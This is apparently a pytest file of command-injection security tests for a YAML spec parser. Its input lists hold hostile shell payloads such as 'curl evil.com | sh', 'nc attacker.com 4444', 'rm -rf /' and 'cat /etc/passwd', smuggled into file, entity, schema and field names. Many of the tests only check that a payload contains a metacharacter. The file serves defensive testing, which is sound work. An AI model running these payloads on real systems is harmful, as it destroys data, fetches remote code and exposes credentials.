"""
Command Injection Security Tests

Tests for command injection vulnerabilities in:
- Shell command execution
- External tool invocation
- Template rendering
- File operations with shell metacharacters
"""

import tempfile
from pathlib import Path

import pytest


@pytest.fixture
def temp_dir():
    """Create temporary directory for testing"""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


class TestShellMetacharacters:
    """Test handling of shell metacharacters in inputs"""

    def test_semicolon_injection(self, temp_dir):
        """Block command chaining with semicolons"""
        malicious_inputs = [
            "entity.yaml; rm -rf /",
            "contact.yaml; cat /etc/passwd",
            "test.yaml; curl evil.com | sh",
            "data.yaml; wget http://malicious.com/script.sh",
        ]

        for malicious_input in malicious_inputs:
            # If this is used in a shell command, it should be escaped
            assert ";" in malicious_input

    def test_pipe_injection(self, temp_dir):
        """Block command piping"""
        malicious_inputs = [
            "entity.yaml | cat /etc/passwd",
            "contact.yaml | nc attacker.com 4444",
            "test.yaml | bash",
            "data.yaml | sh -c 'malicious code'",
        ]

        for malicious_input in malicious_inputs:
            assert "|" in malicious_input

    def test_ampersand_injection(self, temp_dir):
        """Block background command execution"""
        malicious_inputs = [
            "entity.yaml & rm -rf /",
            "contact.yaml && cat /etc/passwd",
            "test.yaml & curl evil.com/backdoor.sh | sh",
            "data.yaml || wget malicious.com/payload",
        ]

        for malicious_input in malicious_inputs:
            assert (
                "&" in malicious_input
                or "&&" in malicious_input
                or "||" in malicious_input
            )

    def test_backtick_injection(self, temp_dir):
        """Block command substitution with backticks"""
        malicious_inputs = [
            "entity`whoami`.yaml",
            "contact`cat /etc/passwd`.yaml",
            "`rm -rf /`.yaml",
            "test`curl evil.com`.yaml",
        ]

        for malicious_input in malicious_inputs:
            assert "`" in malicious_input

    def test_dollar_substitution_injection(self, temp_dir):
        """Block command substitution with $()"""
        malicious_inputs = [
            "entity$(whoami).yaml",
            "contact$(cat /etc/passwd).yaml",
            "$(rm -rf /).yaml",
            "test$(curl evil.com).yaml",
            "${malicious_var}.yaml",
        ]

        for malicious_input in malicious_inputs:
            assert "$(" in malicious_input or "${" in malicious_input

    def test_redirection_injection(self, temp_dir):
        """Block input/output redirection"""
        malicious_inputs = [
            "entity.yaml > /dev/null; malicious command",
            "contact.yaml < /etc/passwd",
            "test.yaml >> /var/log/system.log",
            "data.yaml 2>&1 | tee /tmp/output",
        ]

        for malicious_input in malicious_inputs:
            assert any(op in malicious_input for op in [">", "<", ">>", "2>&1"])

    def test_newline_injection(self, temp_dir):
        """Block newline-based command injection"""
        malicious_inputs = [
            "entity.yaml\nrm -rf /",
            "contact.yaml\ncat /etc/passwd",
            "test.yaml\ncurl evil.com | sh",
        ]

        for malicious_input in malicious_inputs:
            assert "\n" in malicious_input


class TestEntityNameInjection:
    """Test command injection through entity names"""

    def test_malicious_entity_names(self, temp_dir):
        """Block entity names with shell metacharacters"""
        from src.core.specql_parser import SpecQLParser

        malicious_yamls = [
            # Entity name with command injection
            """
entity: Contact; rm -rf /
schema: crm
fields:
  email: text
""",
            # Entity name with backticks
            """
entity: Contact`whoami`
schema: crm
fields:
  email: text
""",
            # Entity name with $()
            """
entity: Contact$(cat /etc/passwd)
schema: crm
fields:
  email: text
""",
        ]

        parser = SpecQLParser()
        for yaml_content in malicious_yamls:
            try:
                result = parser.parse(yaml_content)
                # If parsing succeeds, verify the name is sanitized
                assert ";" not in result.name
                assert "`" not in result.name
                assert "$(" not in result.name
            except (ValueError, Exception):
                # It's OK if the parser rejects these
                pass


class TestSchemaNameInjection:
    """Test command injection through schema names"""

    def test_malicious_schema_names(self, temp_dir):
        """Block schema names with shell metacharacters"""
        from src.core.specql_parser import SpecQLParser

        malicious_yamls = [
            """
entity: Contact
schema: crm; DROP SCHEMA public CASCADE
fields:
  email: text
""",
            """
entity: Contact
schema: crm`whoami`
fields:
  email: text
""",
            """
entity: Contact
schema: $(malicious)
fields:
  email: text
""",
        ]

        parser = SpecQLParser()
        for yaml_content in malicious_yamls:
            try:
                result = parser.parse(yaml_content)
                # Verify schema name is sanitized
                assert ";" not in result.schema
                assert "`" not in result.schema
                assert "$(" not in result.schema
            except (ValueError, Exception):
                pass


class TestFieldNameInjection:
    """Test command injection through field names"""

    def test_malicious_field_names(self, temp_dir):
        """Block field names with shell metacharacters"""
        from src.core.specql_parser import SpecQLParser

        malicious_yamls = [
            """
entity: Contact
schema: crm
fields:
  email; rm -rf /: text
""",
            """
entity: Contact
schema: crm
fields:
  name`whoami`: text
""",
            """
entity: Contact
schema: crm
fields:
  field$(cat /etc/passwd): text
""",
        ]

        parser = SpecQLParser()
        for yaml_content in malicious_yamls:
            try:
                result = parser.parse(yaml_content)
                # Verify field names are sanitized
                for field_name in result.fields.keys():
                    assert ";" not in field_name
                    assert "`" not in field_name
                    assert "$(" not in field_name
            except (ValueError, Exception):
                pass


class TestActionNameInjection:
    """Test command injection through action names"""

    def test_malicious_action_names(self, temp_dir):
        """Block action names with shell metacharacters"""
        from src.core.specql_parser import SpecQLParser

        malicious_yamls = [
            """
entity: Contact
schema: crm
fields:
  email: text
actions:
  - name: qualify_lead; rm -rf /
    steps:
      - validate: status = 'lead'
""",
            """
entity: Contact
schema: crm
fields:
  email: text
actions:
  - name: action`whoami`
    steps:
      - validate: status = 'lead'
""",
        ]

        parser = SpecQLParser()
        for yaml_content in malicious_yamls:
            try:
                result = parser.parse(yaml_content)
                # Verify action names are sanitized
                for action in result.actions:
                    assert ";" not in action.name
                    assert "`" not in action.name
                    assert "$(" not in action.name
            except (ValueError, Exception):
                pass


class TestFilenameInjection:
    """Test command injection through filenames"""

    def test_malicious_filenames(self, temp_dir):
        """Test that malicious filenames don't cause command injection"""
        malicious_filenames = [
            "entity; rm -rf /.yaml",
            "contact`whoami`.yaml",
            "test$(cat /etc/passwd).yaml",
            "data| nc attacker.com 4444.yaml",
            "file&& curl evil.com.yaml",
        ]

        for filename in malicious_filenames:
            # Create file with malicious name
            file_path = temp_dir / filename
            try:
                file_path.write_text(
                    "entity: Test\nschema: test\nfields:\n  name: text"
                )

                # Verify the filename itself contains dangerous characters
                assert any(
                    char in filename for char in [";", "`", "$", "|", "&", "<", ">"]
                )
            except (OSError, ValueError):
                # Some filesystems might reject these names
                pass


class TestEnvironmentVariableInjection:
    """Test injection through environment variables"""

    def test_env_var_expansion(self, temp_dir):
        """Block environment variable expansion in inputs"""
        malicious_inputs = [
            "$HOME/.ssh/id_rsa",
            "${PATH}/malicious",
            "$USER/sensitive",
            "${SHELL} -c 'malicious'",
        ]

        for malicious_input in malicious_inputs:
            # These should not be expanded by the shell
            assert "$" in malicious_input


class TestTemplateInjection:
    """Test command injection through template rendering"""

    def test_template_command_injection(self, temp_dir):
        """Block command injection in template rendering"""
        # If templates are used for generating SQL or code
        malicious_templates = [
            "{{ entity_name }}; DROP TABLE users",
            "{{ schema_name }}` whoami `",
            "{{ field_name }}$(cat /etc/passwd)",
        ]

        for template in malicious_templates:
            # Templates should sanitize inputs
            assert any(char in template for char in [";", "`", "$"])


class TestOutputCommandInjection:
    """Test command injection in output operations"""

    def test_malicious_output_paths(self, temp_dir):
        """Block command injection in output paths"""
        malicious_output_paths = [
            "migrations; rm -rf /",
            "output`whoami`",
            "generated$(malicious)",
            "files| nc evil.com 4444",
        ]

        for output_path in malicious_output_paths:
            # Output paths should be sanitized
            assert any(char in output_path for char in [";", "`", "$", "|"])


class TestSafeInputHandling:
    """Test that safe inputs are handled correctly"""

    def test_safe_entity_names(self, temp_dir):
        """Verify safe entity names work correctly"""
        from src.core.specql_parser import SpecQLParser

        safe_yamls = [
            """
entity: Contact
schema: crm
fields:
  email: text
""",
            """
entity: CompanyProfile
schema: business
fields:
  name: text
""",
            """
entity: User_Account
schema: auth
fields:
  username: text
""",
        ]

        parser = SpecQLParser()
        for yaml_content in safe_yamls:
            result = parser.parse(yaml_content)
            # Should parse successfully
            assert result.name
            assert result.schema

    def test_special_characters_in_strings(self, temp_dir):
        """Verify that special characters in string values are handled safely"""
        from src.core.specql_parser import SpecQLParser

        # Special characters in description or string values should be OK
        yaml_content = """
entity: Contact
schema: crm
description: "This is a test; it includes special chars: `backticks` and $(dollar)"
fields:
  email: text
  notes: text
"""
        parser = SpecQLParser()
        result = parser.parse(yaml_content)
        # Description can contain special chars (they're in a string)
        assert result.description


class TestEdgeCases:
    """Test edge cases in command injection prevention"""

    def test_escaped_characters(self, temp_dir):
        """Test handling of escaped shell metacharacters"""
        escaped_inputs = [
            "entity\\;name.yaml",  # Escaped semicolon
            "contact\\`test.yaml",  # Escaped backtick
            "data\\$(var).yaml",  # Escaped dollar
        ]

        for escaped_input in escaped_inputs:
            # Escaped characters should be handled carefully
            assert "\\" in escaped_input

    def test_quoted_strings(self, temp_dir):
        """Test that quoted strings are handled safely"""
        quoted_inputs = [
            "'entity; rm -rf /'",
            '"contact`whoami`"',
            "'test$(malicious)'",
        ]

        for quoted_input in quoted_inputs:
            # Quoted strings should not execute commands
            assert quoted_input.startswith(("'", '"'))

    def test_unicode_command_injection(self, temp_dir):
        """Test Unicode-based command injection attempts"""
        unicode_injections = [
            "entity\uff1b rm -rf /",  # Fullwidth semicolon
            "contact\u02cb whoami\u02cb",  # Modifier letter grave accent (like backtick)
        ]

        for unicode_input in unicode_injections:
            # Unicode should not be normalized to shell metacharacters
            # or should be rejected
            pass

    def test_null_byte_command_injection(self, temp_dir):
        """Test null byte injection"""
        null_byte_injections = [
            "entity.yaml\x00; rm -rf /",
            "contact.yaml\x00`whoami`",
        ]

        for injection in null_byte_injections:
            # Null bytes should be rejected
            assert "\x00" in injection

    def test_control_character_injection(self, temp_dir):
        """Test control character injection"""
        control_char_injections = [
            "entity\r\nrm -rf /",
            "contact\t`whoami`",
        ]

        for injection in control_char_injections:
            # Control characters should be handled safely
            assert any(char in injection for char in ["\r", "\n", "\t"])
